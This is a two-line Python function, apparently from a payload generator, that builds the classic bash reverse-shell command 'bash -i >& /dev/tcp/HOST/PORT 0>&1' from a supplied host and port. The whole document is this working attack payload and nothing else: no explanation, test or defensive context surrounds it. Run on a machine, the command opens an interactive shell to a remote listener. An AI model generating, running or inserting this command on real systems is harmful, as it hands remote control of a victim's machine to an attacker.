def bash(host, port):
    return "bash -i >& /dev/tcp/{}/{} 0>&1".format(host, port)
